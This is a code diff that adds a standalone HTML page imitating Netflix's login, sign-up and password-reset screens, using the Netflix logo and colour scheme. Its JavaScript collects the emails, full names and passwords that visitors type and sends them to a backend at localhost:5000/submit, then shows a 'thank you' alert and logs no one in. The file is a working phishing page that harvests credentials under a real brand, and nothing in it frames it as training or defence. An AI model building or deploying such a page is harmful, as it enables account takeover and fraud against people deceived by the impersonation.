@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Netflix Login & Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #141414;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            background-color: #333;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            width: 400px;
+            text-align: center;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 5px;
+            background-color: #444;
+            color: #ffffff;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #f40612;
+        }
+        .link {
+            margin-top: 10px;
+            color: #b3b3b3;
+        }
+        .link a {
+            color: #e50914;
+            text-decoration: none;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Netflix_logo.svg" alt="Netflix Logo" class="logo" />
+    <div class="container" id="login-container">
+        <h1>Login</h1>
+        <form id="login-form">
+            <input type="email" placeholder="Email or Phone Number" required name="email" />
+            <input type="password" placeholder="Password" required name="password" />
+            <button type="submit">Sign In</button>
+        </form>
+        <div class="link">
+            <a href="#" id="forgot-password-link">Forgot Password?</a>
+        </div>
+        <div class="link">
+            <p>New to Netflix? <a href="#" id="show-signup">Sign Up</a></p>
+        </div>
+    </div>
+
+    <div class="container" style="display: none;" id="signup-container">
+        <h1>Sign Up</h1>
+        <form id="signup-form">
+            <input type="text" placeholder="Full Name" required name="fullname" />
+            <input type="email" placeholder="Email" required name="email" />
+            <input type="password" placeholder="Password" required name="password" />
+            <button type="submit">Create Account</button>
+        </form>
+        <div class="link">
+            <p>Already have an account? <a href="#" id="show-login">Login</a></p>
+        </div>
+    </div>
+
+    <div class="container" style="display: none;" id="reset-password-container">
+        <h1>Reset Password</h1>
+        <form id="reset-password-form">
+            <input type="email" placeholder="Email" required name="email" />
+            <button type="submit">Send Reset Link</button>
+        </form>
+        <div class="link">
+            <p>Remembered your password? <a href="#" id="back-to-login">Back to Login</a></p>
+        </div>
+    </div>
+
+    <script>
+        const loginContainer = document.getElementById('login-container');
+        const signupContainer = document.getElementById('signup-container');
+        const resetPasswordContainer = document.getElementById('reset-password-container');
+
+        document.getElementById('show-signup').addEventListener('click', function(e) {
+            e.preventDefault();
+            signupContainer.style.display = 'block';
+            loginContainer.style.display = 'none';
+            resetPasswordContainer.style.display = 'none';
+        });
+
+        document.getElementById('show-login').addEventListener('click', function(e) {
+            e.preventDefault();
+            loginContainer.style.display = 'block';
+            signupContainer.style.display = 'none';
+            resetPasswordContainer.style.display = 'none';
+        });
+
+        document.getElementById('forgot-password-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            resetPasswordContainer.style.display = 'block';
+            loginContainer.style.display = 'none';
+            signupContainer.style.display = 'none';
+        });
+
+        document.getElementById('back-to-login').addEventListener('click', function(e) {
+            e.preventDefault();
+            loginContainer.style.display = 'block';
+            resetPasswordContainer.style.display = 'none';
+            signupContainer.style.display = 'none';
+        });
+
+        // Capture form submissions and send data to backend
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = e.target.email.value;
+            const password = e.target.password.value;
+            fetch('http://localhost:5000/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'login', email, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Login submitted. Thank you!');
+            })
+            .catch(error => {
+                alert('Error submitting login.');
+                console.error('Error:', error);
+            });
+        });
+
+        document.getElementById('signup-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const fullname = e.target.fullname.value;
+            const email = e.target.email.value;
+            const password = e.target.password.value;
+            fetch('http://localhost:5000/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'signup', fullname, email, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Signup submitted. Thank you!');
+            })
+            .catch(error => {
+                alert('Error submitting signup.');
+                console.error('Error:', error);
+            });
+        });
+
+        document.getElementById('reset-password-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = e.target.email.value;
+            fetch('http://localhost:5000/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'reset-password', email })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Reset link sent. Thank you!');
+            })
+            .catch(error => {
+                alert('Error submitting reset request.');
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
